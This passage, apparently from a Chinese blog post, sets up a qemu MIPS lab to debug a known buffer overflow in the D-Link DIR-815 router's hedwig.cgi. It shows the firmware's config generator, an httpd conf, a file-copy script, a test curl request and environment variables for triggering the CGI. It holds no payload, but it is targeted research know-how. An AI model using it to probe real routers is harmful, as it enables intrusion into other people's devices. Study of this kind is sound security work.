        <span class="token constant">CGI</span>            <span class="token punctuation">{</span> cgi <span class="token punctuation">}</span>
        Imagemap    <span class="token punctuation">{</span> map <span class="token punctuation">}</span>
        Redirect    <span class="token punctuation">{</span> url <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    External
    <span class="token punctuation">{</span>
        <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> php <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">&lt;?</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/phplib/phyinf.php"</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">http_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$ifname</span><span class="token punctuation">,</span> <span class="token variable">$af</span><span class="token punctuation">,</span> <span class="token variable">$ipaddr</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$hnap</span><span class="token punctuation">,</span> <span class="token variable">$widget</span><span class="token punctuation">,</span> <span class="token variable">$smart404</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span>
        <span class="token string">"Server"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"{"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerName \""</span><span class="token punctuation">.</span><span class="token variable">$sname</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerId \""</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Family "</span><span class="token punctuation">.</span><span class="token variable">$af</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Interface "</span><span class="token punctuation">.</span><span class="token variable">$ifname</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Address "</span><span class="token punctuation">.</span><span class="token variable">$ipaddr</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Port "</span><span class="token punctuation">.</span><span class="token variable">$port</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Virtual"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    {"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        AnyHost"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/web"</span><span class="token punctuation">.</span>            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            IndexNames { index.php }"</span><span class="token punctuation">.</span>        <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token operator">==</span><span class="token string">"LAN-1"</span><span class="token operator">||</span><span class="token variable">$uid</span><span class="token operator">==</span><span class="token string">"WAN-1"</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/phpcgi { txt }"</span><span class="token punctuation">.</span>    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$widget</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/phpcgi { router_info.xml }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/phpcgi { post_login.xml }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">;</span>    
    <span class="token keyword">echo</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smart404</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span>
        <span class="token string">'       Control'</span><span class="token punctuation">.</span>                           <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'       {'</span><span class="token punctuation">.</span>                                 <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'           Alias /smart404'</span><span class="token punctuation">.</span>               <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'           Location /htdocs/smart404'</span><span class="token punctuation">.</span>     <span class="token string">'\n'</span><span class="token punctuation">.</span>
        <span class="token string">'       }'</span><span class="token punctuation">.</span>                                 <span class="token string">'\n'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hnap</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /HNAP1"</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/HNAP1"</span><span class="token punctuation">.</span>        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /usr/sbin/hnap { hnap }"</span><span class="token punctuation">.</span>    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            IndexNames { index.hnap }"</span><span class="token punctuation">.</span>        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span>
        <span class="token string">"    }"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"}"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">ssdp_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$ifname</span><span class="token punctuation">,</span> <span class="token variable">$af</span><span class="token punctuation">,</span> <span class="token variable">$ipaddr</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$af</span><span class="token operator">==</span><span class="token string">"inet6"</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span>
        <span class="token string">"Server"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"{"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerName \""</span><span class="token punctuation">.</span><span class="token variable">$sname</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerId \""</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Family "</span><span class="token punctuation">.</span><span class="token variable">$af</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Interface "</span><span class="token punctuation">.</span><span class="token variable">$ifname</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Port 1900"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Address 239.255.255.250"</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Datagrams On"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Virtual"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    {"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        AnyHost"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/upnp/docs/"</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"                /htdocs/upnp/ssdpcgi { * }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    }"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"}"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">upnp_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$ifname</span><span class="token punctuation">,</span> <span class="token variable">$af</span><span class="token punctuation">,</span> <span class="token variable">$ipaddr</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$af</span><span class="token operator">==</span><span class="token string">"inet6"</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span>
        <span class="token string">"Server"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"{"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerName \""</span><span class="token punctuation">.</span><span class="token variable">$sname</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    ServerId \""</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\""</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Family "</span><span class="token punctuation">.</span><span class="token variable">$af</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Interface "</span><span class="token punctuation">.</span><span class="token variable">$ifname</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Address "</span><span class="token punctuation">.</span><span class="token variable">$ipaddr</span><span class="token punctuation">.</span>                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Port "</span><span class="token punctuation">.</span><span class="token variable">$port</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    Virtual"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    {"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        AnyHost"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        {"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Alias /"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"            Location /htdocs/upnp/docs/"</span><span class="token punctuation">.</span><span class="token variable">$uid</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"        }"</span><span class="token punctuation">.</span>                                    <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"    }"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"}"</span><span class="token punctuation">.</span>                                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token string">"/runtime/services/http/server"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$model</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/modelname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ver</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/firmwareversion"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$smart404</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/smart404"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sname</span>    <span class="token operator">=</span> <span class="token string">"Linux, HTTP/1.1, "</span><span class="token punctuation">.</span><span class="token variable">$model</span><span class="token punctuation">.</span><span class="token string">" Ver "</span><span class="token punctuation">.</span><span class="token variable">$ver</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* HTTP server name */</span>
    <span class="token variable">$suname</span> <span class="token operator">=</span> <span class="token string">"Linux, UPnP/1.0, "</span><span class="token punctuation">.</span><span class="token variable">$model</span><span class="token punctuation">.</span><span class="token string">" Ver "</span><span class="token punctuation">.</span><span class="token variable">$ver</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* UPnP server name */</span>
    <span class="token variable">$mode</span>     <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"mode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$inf</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"inf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ifname</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"ifname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ipaddr</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"ipaddr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$port</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"port"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$hnap</span>    <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"hnap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$widget</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"widget"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$af</span>        <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"af"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$af</span><span class="token operator">!=</span><span class="token string">""</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$ifname</span><span class="token operator">!=</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span>        <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token string">"HTTP"</span><span class="token punctuation">)</span> <span class="token function">http_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$inf</span><span class="token punctuation">,</span><span class="token variable">$ifname</span><span class="token punctuation">,</span><span class="token variable">$af</span><span class="token punctuation">,</span><span class="token variable">$ipaddr</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$hnap</span><span class="token punctuation">,</span><span class="token variable">$widget</span><span class="token punctuation">,</span><span class="token variable">$smart404</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span>    <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token string">"SSDP"</span><span class="token punctuation">)</span> <span class="token function">ssdp_server</span><span class="token punctuation">(</span><span class="token variable">$sname</span><span class="token punctuation">,</span> <span class="token variable">$inf</span><span class="token punctuation">,</span><span class="token variable">$ifname</span><span class="token punctuation">,</span><span class="token variable">$af</span><span class="token punctuation">,</span><span class="token variable">$ipaddr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span>    <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token string">"UPNP"</span><span class="token punctuation">)</span> <span class="token function">upnp_server</span><span class="token punctuation">(</span><span class="token variable">$suname</span><span class="token punctuation">,</span><span class="token variable">$inf</span><span class="token punctuation">,</span><span class="token variable">$ifname</span><span class="token punctuation">,</span><span class="token variable">$af</span><span class="token punctuation">,</span><span class="token variable">$ipaddr</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span></code></pre>
<p>可以了解到该php用于生成配置文件，由于我们只需要其中的http服务，可以按照该配置文件改写我们所需的conf。</p>
<pre class=" language-php"><code class="language-php">Umask <span class="token number">026</span>
PIDFile <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>httpd<span class="token punctuation">.</span>pid
LogGMT On  <span class="token shell-comment comment">#开启log</span>
ErrorLog <span class="token operator">/</span>log <span class="token shell-comment comment">#log文件</span>

Tuning
<span class="token punctuation">{</span>
    NumConnections <span class="token number">15</span>
    BufSize <span class="token number">12288</span>
    InputBufSize <span class="token number">4096</span>
    ScriptBufSize <span class="token number">4096</span>
    NumHeaders <span class="token number">100</span>
    Timeout <span class="token number">60</span>
    ScriptTimeout <span class="token number">60</span>
<span class="token punctuation">}</span>

Control
<span class="token punctuation">{</span>
    Types
    <span class="token punctuation">{</span>
        text<span class="token operator">/</span>html    <span class="token punctuation">{</span> html htm <span class="token punctuation">}</span>
        text<span class="token operator">/</span>xml    <span class="token punctuation">{</span> xml <span class="token punctuation">}</span>
        text<span class="token operator">/</span>plain    <span class="token punctuation">{</span> txt <span class="token punctuation">}</span>
        image<span class="token operator">/</span>gif    <span class="token punctuation">{</span> gif <span class="token punctuation">}</span>
        image<span class="token operator">/</span>jpeg    <span class="token punctuation">{</span> jpg <span class="token punctuation">}</span>
        text<span class="token operator">/</span>css    <span class="token punctuation">{</span> css <span class="token punctuation">}</span>
        application<span class="token operator">/</span>octet<span class="token operator">-</span>stream <span class="token punctuation">{</span> <span class="token operator">*</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    Specials
    <span class="token punctuation">{</span>
        Dump        <span class="token punctuation">{</span> <span class="token operator">/</span>dump <span class="token punctuation">}</span>
        <span class="token constant">CGI</span>            <span class="token punctuation">{</span> cgi <span class="token punctuation">}</span>
        Imagemap    <span class="token punctuation">{</span> map <span class="token punctuation">}</span>
        Redirect    <span class="token punctuation">{</span> url <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    External
    <span class="token punctuation">{</span>
        <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> php <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


Server
<span class="token punctuation">{</span>
    ServerName <span class="token string">"Linux, HTTP/1.1, "</span>
    ServerId <span class="token string">"1234"</span>
    Family inet
    <span class="token keyword">Interface</span> <span class="token class-name">eth0</span> <span class="token shell-comment comment">#对应qemu虚拟机的网卡</span>
    Address <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">79.143</span> <span class="token shell-comment comment">#对于qemu虚拟机IP</span>
    Port <span class="token string">"1234"</span> <span class="token shell-comment comment">#对应未被使用的端口</span>
    Virtual
    <span class="token punctuation">{</span>
        AnyHost
        Control
        <span class="token punctuation">{</span>
            Alias <span class="token operator">/</span>
            Location <span class="token operator">/</span>htdocs<span class="token operator">/</span>web
            IndexNames <span class="token punctuation">{</span> index<span class="token punctuation">.</span>php <span class="token punctuation">}</span>
            External
            <span class="token punctuation">{</span>
                <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> router_info<span class="token punctuation">.</span>xml <span class="token punctuation">}</span>
                <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> post_login<span class="token punctuation">.</span>xml <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        Control
        <span class="token punctuation">{</span>
            Alias <span class="token operator">/</span><span class="token constant">HNAP1</span>
            Location <span class="token operator">/</span>htdocs<span class="token operator">/</span><span class="token constant">HNAP1</span>
            External
            <span class="token punctuation">{</span>
                <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>hnap <span class="token punctuation">{</span> hnap <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            IndexNames <span class="token punctuation">{</span> index<span class="token punctuation">.</span>hnap <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>接下来利用qemu系统模式仿真路由器的运行环境，具体的配置过程在文章<a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a>的qemu网络配置中有提到。</p>
<p>利用下面命令启动，接下来的实验是一次性实验，因为会覆盖qemu虚拟机原本文件系统中的/etc等文件夹从而损坏原有配置，所以无法第二次启动。</p>
<pre class=" language-sh"><code class="language-sh">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic</code></pre>
<p>测试能ping通的情况下，将文件系统利用scp命令拷贝到mipsel虚拟机中。</p>
<pre class=" language-sh"><code class="language-sh">sudo scp -r squashfs-root root@192.168.79.143:/root/</code></pre>
<p>之后编写copy.sh脚本配置启动http服务需要的环境包括动态链接库，以及conf配置文件中提到的<code>/usr/sbin/phpcgi</code>，<code>/usr/sbin/hnap</code>。</p>
<p>copy.sh，需要进入squashfs-root目录使用，脚本最后启动了http服务。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
cp conf /
cp sbin/httpd /
cp -rf htdocs/ /
rm /etc/services
cp -rf etc/ /
cp lib/ld-uClibc-0.9.30.1.so  /lib/
cp lib/libcrypt-0.9.30.1.so  /lib/
cp lib/libc.so.0  /lib/
cp lib/libgcc_s.so.1  /lib/
cp lib/ld-uClibc.so.0  /lib/
cp lib/libcrypt.so.0  /lib/
cp lib/libgcc_s.so  /lib/
cp lib/libuClibc-0.9.30.1.so  /lib/
cd /
ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
ln -s /htdocs/cgibin /usr/sbin/phpcgi
ln -s  /htdocs/cgibin /usr/sbin/hnap
./httpd -f conf</code></pre>
<p>之后可以在浏览器访问conf文件中配置的192.168.79.143:1234/hedwig.cgi</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/hedwigchi%E6%96%87%E4%BB%B6.png" alt=""></p>
<p>或者在宿主机中使用以下命令：其中-v显示详细信息，-X指定什么指令，-H 自定义头信息传递给服务器，-b 指定cookie字符串。</p>
<pre class=" language-sh"><code class="language-sh">#curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"
*   Trying 192.168.79.143...
* Connected to 192.168.79.143 (192.168.79.143) port 1234 (#0)
> POST /hedwig.cgi HTTP/1.1
> Host: 192.168.79.143:1234
> User-Agent: curl/7.47.0
> Accept: */*
> Cookie: uid=zh
> Content-Length: 8
> 
< HTTP/1.1 200 OK
< Server: Linux, HTTP/1.1, 
< Date: Sun, 24 May 2020 01:00:46 GMT
< Transfer-Encoding: chunked
< Content-Type: text/xml
< 
* Connection #0 to host 192.168.79.143 left intact
<hedwig><result>FAILED</result><message>no xml data.</message></hedwig>% </code></pre>
<p>然后在mips虚拟机查看log文件：</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# cat /log
Sun May 24 00:58:11 2020 [1109] *** Mathopd/1.6b9 starting
Sun May 24 00:58:20 2020 [1109] process_headers: method[GET], nheaders=[6], URL[/]
Sun May 24 00:58:43 2020 [1109] process_headers: method[GET], nheaders=[6], URL[/hedwig.cgi]
Sun May 24 00:58:43 2020 [1109] child process 1111 exited with status 255
Sun May 24 00:59:43 2020 [1109] script timeout to 192.168.79.145[52472]
Sun May 24 01:00:46 2020 [1109] process_headers: method[POST], nheaders=[4], URL[/hedwig.cgi]
Sun May 24 01:00:46 2020 [1109] child process 1112 exited with status 255</code></pre>
<p>到这里可以看到我们需要的web服务器以及启动了。</p>
<h2 id="gdbbserver调试"><a href="#gdbbserver调试" class="headerlink" title="gdbbserver调试"></a>gdbbserver调试</h2><p>接下来尝试调试<code>/htdocs/web/hedwig.cgi</code>文件</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
HTTP/1.1 200 OK
Content-Type: text/xml

<hedwig><result>FAILED</result><message>no REQUEST</message></hedwig>root@debian-mipsel:~/squashfs-root#</code></pre>
<p>返回no REQUEST，查看IDA静态反汇编得知没有指定环境变量<code>REQUEST_METHOD</code>的值。所以想要触发漏洞进行调试的话，还是需要通过export 设置相关环境变量。</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"
root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"
root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"
root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
HTTP/1.1 200 OK
Content-Type: text/xml
#之前分析过因为没有post数据
<hedwig><result>FAILED</result><message>no xml data.</message></hedwig>
root@debian-mipsel:~/squashfs-root# </code></pre>
<p>使用<code>echo &#39;uid=1234&#39;| /htdocs/web/hedwig.cgi</code>运行成功。</p>
